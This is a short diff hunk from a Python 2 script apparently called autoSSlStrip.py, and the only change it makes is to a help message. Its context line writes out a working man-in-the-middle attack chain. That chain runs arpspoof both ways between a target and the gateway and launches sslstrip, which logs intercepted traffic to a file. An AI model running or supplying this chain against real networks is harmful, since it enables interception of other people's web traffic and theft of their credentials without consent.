@@ -29,5 +29,5 @@ def main():
 		commands.getoutput('xterm -e "arpspoof -i '+INTERFACE+' -t '+gateway+' '+TARGET+'" | xterm -e "arpspoof -i '+INTERFACE+' -t '+TARGET+' '+gateway+'" | xterm -e "sslstrip -w '+OUTPUT_FILE+' -l 8080"')
 	except Exception, e:
 		print "Error - check parameters!"
-		print "python script.py -h for help"
+		print "python autoSSlStrip.py -h for help"
 main()
